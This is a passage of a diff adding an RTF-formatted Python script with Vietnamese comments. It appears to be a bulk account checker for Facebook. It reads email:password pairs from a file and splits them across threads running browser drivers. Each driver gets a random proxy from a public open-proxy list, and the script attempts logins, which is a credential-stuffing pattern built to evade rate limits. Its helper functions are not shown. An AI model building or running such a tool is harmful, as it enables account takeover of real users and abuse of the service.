+\cb3     \cf6 \strokec6 num_drivers\cf4 \strokec4  \cf7 \strokec7 =\cf4 \strokec4  \cf5 \strokec5 int\cf4 \strokec4 (\cf11 \strokec11 input\cf4 \strokec4 (\cf8 \strokec8 "Nh\uc0\u7853 p s
+\f1 \uc0\u7889 
+\f0  l\uc0\u432 \u7907 ng driver b\u7841 n mu
+\f1 \uc0\u7889 
+\f0 n s
+\f1 \uc0\u7917 
+\f0  d\uc0\u7909 ng: "\cf4 \strokec4 ))\cb1 \
+\cb3     \cf6 \strokec6 wait_time\cf4 \strokec4  \cf7 \strokec7 =\cf4 \strokec4  \cf5 \strokec5 float\cf4 \strokec4 (\cf11 \strokec11 input\cf4 \strokec4 (\cf8 \strokec8 "Nh\uc0\u7853 p th\u7901 i gian ch\u7901  (\u273 \u417 n v\u7883  gi\'e2y) tr\u432 \u7899 c khi ki
+\f1 \uc0\u7875 
+\f0 m tra t\'e0i kho
+\f1 \uc0\u7843 
+\f0 n: "\cf4 \strokec4 ))\cb1 \
+\cb3     \cb1 \
+\cb3     \cf6 \strokec6 proxies\cf4 \strokec4  \cf7 \strokec7 =\cf4 \strokec4  \cf11 \strokec11 get_proxies_from_url\cf4 \strokec4 (\cf6 \strokec6 proxy_url\cf4 \strokec4 )  \cf9 \strokec9 # L
+\f1 \uc0\u7845 
+\f0 y proxy t\uc0\u7915  URL\cf4 \cb1 \strokec4 \
+\
+\cb3     \cf2 \strokec2 if\cf4 \strokec4  \cf10 \strokec10 not\cf4 \strokec4  \cf6 \strokec6 proxies\cf4 \strokec4 :\cb1 \
+\cb3         \cf11 \strokec11 print\cf4 \strokec4 (\cf8 \strokec8 "Kh\'f4ng c\'f3 proxy n\'e0o \uc0\u273 
+\f1 \uc0\u7875 
+\f0  s
+\f1 \uc0\u7917 
+\f0  d\uc0\u7909 ng."\cf4 \strokec4 )\cb1 \
+\cb3         \cf2 \strokec2 return\cf4 \cb1 \strokec4 \
+\
+\cb3     \cf2 \strokec2 while\cf4 \strokec4  \cf6 \strokec6 attempts\cf4 \strokec4  \cf7 \strokec7 <\cf4 \strokec4  \cf6 \strokec6 max_attempts\cf4 \strokec4 :\cb1 \
+\cb3         \cf6 \strokec6 password\cf4 \strokec4  \cf7 \strokec7 =\cf4 \strokec4  \cf11 \strokec11 input\cf4 \strokec4 (\cf8 \strokec8 "Nh\uc0\u7853 p m\u7853 t kh
+\f1 \uc0\u7849 
+\f0 u c
+\f1 \uc0\u7911 
+\f0 a b\uc0\u7841 n: "\cf4 \strokec4 )\cb1 \
+\
+\cb3         \cf2 \strokec2 if\cf4 \strokec4  \cf11 \strokec11 check_password_from_url\cf4 \strokec4 (\cf6 \strokec6 password\cf4 \strokec4 , \cf6 \strokec6 url\cf4 \strokec4 ):\cb1 \
+\cb3             \cf11 \strokec11 print\cf4 \strokec4 (\cf8 \strokec8 "\uc0\u272 \u259 ng nh\u7853 p th\'e0nh c\'f4ng!"\cf4 \strokec4 )\cb1 \
+\cb3             \cf11 \strokec11 clear\cf4 \strokec4 ()\cb1 \
+\cb3             \cf2 \strokec2 with\cf4 \strokec4  \cf11 \strokec11 open\cf4 \strokec4 (\cf8 \strokec8 'NFA.txt'\cf4 \strokec4 , \cf8 \strokec8 'r'\cf4 \strokec4 ) \cf2 \strokec2 as\cf4 \strokec4  \cf6 \strokec6 file\cf4 \strokec4 :\cb1 \
+\cb3                 \cf6 \strokec6 lines\cf4 \strokec4  \cf7 \strokec7 =\cf4 \strokec4  \cf6 \strokec6 file\cf4 \strokec4 .\cf11 \strokec11 readlines\cf4 \strokec4 ()\cb1 \
+\cb3             \cf6 \strokec6 accounts_per_driver\cf4 \strokec4  \cf7 \strokec7 =\cf4 \strokec4  [\cf6 \strokec6 lines\cf4 \strokec4 [\cf6 \strokec6 i\cf4 \strokec4 ::\cf6 \strokec6 num_drivers\cf4 \strokec4 ] \cf2 \strokec2 for\cf4 \strokec4  \cf6 \strokec6 i\cf4 \strokec4  \cf2 \strokec2 in\cf4 \strokec4  \cf5 \strokec5 range\cf4 \strokec4 (\cf6 \strokec6 num_drivers\cf4 \strokec4 )]\cb1 \
+\cb3             \cf6 \strokec6 threads\cf4 \strokec4  \cf7 \strokec7 =\cf4 \strokec4  []\cb1 \
+\cb3             \cf2 \strokec2 for\cf4 \strokec4  \cf6 \strokec6 i\cf4 \strokec4  \cf2 \strokec2 in\cf4 \strokec4  \cf5 \strokec5 range\cf4 \strokec4 (\cf6 \strokec6 num_drivers\cf4 \strokec4 ):\cb1 \
+\cb3                 \cf6 \strokec6 accounts\cf4 \strokec4  \cf7 \strokec7 =\cf4 \strokec4  [(\cf6 \strokec6 line\cf4 \strokec4 .\cf11 \strokec11 strip\cf4 \strokec4 ().\cf11 \strokec11 split\cf4 \strokec4 (\cf8 \strokec8 ':'\cf4 \strokec4 )[\cf12 \strokec12 0\cf4 \strokec4 ], \cf6 \strokec6 line\cf4 \strokec4 .\cf11 \strokec11 strip\cf4 \strokec4 ().\cf11 \strokec11 split\cf4 \strokec4 (\cf8 \strokec8 ':'\cf4 \strokec4 )[\cf12 \strokec12 1\cf4 \strokec4 ]) \cf2 \strokec2 for\cf4 \strokec4  \cf6 \strokec6 line\cf4 \strokec4  \cf2 \strokec2 in\cf4 \strokec4  \cf6 \strokec6 accounts_per_driver\cf4 \strokec4 [\cf6 \strokec6 i\cf4 \strokec4 ]]\cb1 \
+\cb3                 \cf6 \strokec6 proxy\cf4 \strokec4  \cf7 \strokec7 =\cf4 \strokec4  \cf5 \strokec5 random\cf4 \strokec4 .\cf6 \strokec6 choice\cf4 \strokec4 (\cf6 \strokec6 proxies\cf4 \strokec4 )  \cf9 \strokec9 # Ch\uc0\u7885 n m\u7897 t proxy ng
+\f1 \uc0\u7851 
+\f0 u nhi\'ean t\uc0\u7915  danh s\'e1ch\cf4 \cb1 \strokec4 \
+\cb3                 \cf6 \strokec6 thread\cf4 \strokec4  \cf7 \strokec7 =\cf4 \strokec4  \cf5 \strokec5 threading\cf4 \strokec4 .\cf5 \strokec5 Thread\cf4 \strokec4 (\cf6 \strokec6 target\cf7 \strokec7 =\cf11 \strokec11 check_account_for_driver\cf4 \strokec4 , \cf6 \strokec6 args\cf7 \strokec7 =\cf4 \strokec4 (\cf6 \strokec6 accounts\cf4 \strokec4 , \cf6 \strokec6 wait_time\cf4 \strokec4 , \cf6 \strokec6 proxy\cf4 \strokec4 , \cf6 \strokec6 proxies\cf4 \strokec4 ))\cb1 \
+\cb3                 \cf6 \strokec6 threads\cf4 \strokec4 .\cf11 \strokec11 append\cf4 \strokec4 (\cf6 \strokec6 thread\cf4 \strokec4 )\cb1 \
+\cb3                 \cf6 \strokec6 thread\cf4 \strokec4 .\cf11 \strokec11 start\cf4 \strokec4 ()\cb1 \
+\cb3             \cf2 \strokec2 for\cf4 \strokec4  \cf6 \strokec6 thread\cf4 \strokec4  \cf2 \strokec2 in\cf4 \strokec4  \cf6 \strokec6 threads\cf4 \strokec4 :\cb1 \
+\cb3                 \cf6 \strokec6 thread\cf4 \strokec4 .join()\cb1 \
+\cb3             \cf2 \strokec2 break\cf4 \cb1 \strokec4 \
+\cb3         \cf2 \strokec2 else\cf4 \strokec4 :\cb1 \
+\cb3             \cf11 \strokec11 print\cf4 \strokec4 (\cf8 \strokec8 "M\uc0\u7853 t kh
+\f1 \uc0\u7849 
+\f0 u sai!"\cf4 \strokec4 )\cb1 \
+\cb3         \cf6 \strokec6 attempts\cf4 \strokec4  \cf7 \strokec7 +=\cf4 \strokec4  \cf12 \strokec12 1\cf4 \cb1 \strokec4 \
+\cb3     \cf2 \strokec2 if\cf4 \strokec4  \cf6 \strokec6 attempts\cf4 \strokec4  \cf7 \strokec7 ==\cf4 \strokec4  \cf6 \strokec6 max_attempts\cf4 \strokec4 :\cb1 \
+\cb3         \cf11 \strokec11 print\cf4 \strokec4 (\cf8 \strokec8 "\uc0\u272 \'e3 h
+\f1 \uc0\u7871 
+\f0 t s
+\f1 \uc0\u7889 
+\f0  l
+\f1 \uc0\u7847 
+\f0 n th
+\f1 \uc0\u7917 
+\f0 , \uc0\u273 \u259 ng xu
+\f1 \uc0\u7845 
+\f0 t."\cf4 \strokec4 )\cb1 \
+\
+\pard\pardeftab720\sl360\partightenfactor0
+\cf9 \cb3 \strokec9 # H\'e0m ki
+\f1 \uc0\u7875 
+\f0 m tra t\'e0i kho
+\f1 \uc0\u7843 
+\f0 n cho t\uc0\u7915 ng driver\cf4 \cb1 \strokec4 \
+\pard\pardeftab720\sl360\partightenfactor0
+\cf10 \cb3 \strokec10 def\cf4 \strokec4  \cf11 \strokec11 check_account_for_driver\cf4 \strokec4 (\cf6 \strokec6 accounts\cf4 \strokec4 , \cf6 \strokec6 wait_time\cf4 \strokec4 , \cf6 \strokec6 proxy\cf4 \strokec4 , \cf6 \strokec6 proxies\cf4 \strokec4 ):\cb1 \
+\pard\pardeftab720\sl360\partightenfactor0
+\cf4 \cb3     \cf2 \strokec2 for\cf4 \strokec4  \cf6 \strokec6 email\cf4 \strokec4 , \cf6 \strokec6 password\cf4 \strokec4  \cf2 \strokec2 in\cf4 \strokec4  \cf6 \strokec6 accounts\cf4 \strokec4 :\cb1 \
+\cb3         \cf6 \strokec6 driver\cf4 \strokec4  \cf7 \strokec7 =\cf4 \strokec4  \cf11 \strokec11 create_driver_with_proxy\cf4 \strokec4 (\cf6 \strokec6 proxy\cf4 \strokec4 )  \cf9 \strokec9 # T\uc0\u7841 o driver v\u7899 i proxy\cf4 \cb1 \strokec4 \
+\cb3         \cf11 \strokec11 print\cf4 \strokec4 (\cf10 \strokec10 f\cf8 \strokec8 "\uc0\u272 ang ki
+\f1 \uc0\u7875 
+\f0 m tra t\'e0i kho
+\f1 \uc0\u7843 
+\f0 n: \cf10 \strokec10 \{\cf6 \strokec6 email\cf10 \strokec10 \}\cf8 \strokec8  v\uc0\u7899 i proxy: \cf10 \strokec10 \{\cf6 \strokec6 proxy\cf10 \strokec10 \}\cf8 \strokec8 "\cf4 \strokec4 )  \cf9 \strokec9 # Hi
+\f1 \uc0\u7875 
+\f0 n th\uc0\u7883  proxy \u273 ang s
+\f1 \uc0\u7917 
+\f0  d\uc0\u7909 ng\cf4 \cb1 \strokec4 \
+\cb3         \cf11 \strokec11 login_and_check_account\cf4 \strokec4 (\cf6 \strokec6 driver\cf4 \strokec4 , \cf6 \strokec6 email\cf4 \strokec4 , \cf6 \strokec6 password\cf4 \strokec4 , \cf6 \strokec6 wait_time\cf4 \strokec4 , \cf6 \strokec6 proxy\cf4 \strokec4 , \cf6 \strokec6 proxies\cf4 \strokec4 )\cb1 \
+\cb3         \cf6 \strokec6 driver\cf4 \strokec4 .\cf11 \strokec11 quit\cf4 \strokec4 ()\cb1 \
+\
+\pard\pardeftab720\sl360\partightenfactor0
+\cf9 \cb3 \strokec9 # B
+\f1 \uc0\u7855 
+\f0 t \uc0\u273 
+\f1 \uc0\u7847 
+\f0 u th
+\f1 \uc0\u7917 
+\f0  \uc0\u273 \u259 ng nh\u7853 p v\'e0 ki
+\f1 \uc0\u7875 
+\f0 m tra t\'e0i kho
+\f1 \uc0\u7843 
+\f0 n\cf4 \cb1 \strokec4 \
+\pard\pardeftab720\sl360\partightenfactor0
+\cf6 \cb3 \strokec6 proxy_url\cf4 \strokec4  \cf7 \strokec7 =\cf4 \strokec4  \cf8 \strokec8 "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt"\cf4 \strokec4   \cf9 \strokec9 # S
+\f1 \uc0\u7917 
+\f0 a URL RAW\cf4 \cb1 \strokec4 \
+\pard\pardeftab720\sl360\partightenfactor0
+\cf11 \cb3 \strokec11 try_login_and_check_facebook\cf4 \strokec4 (\cf6 \strokec6 url\cf4 \strokec4 , \cf6 \strokec6 proxy_url\cf4 \strokec4 )\cb1 \
+\
+}
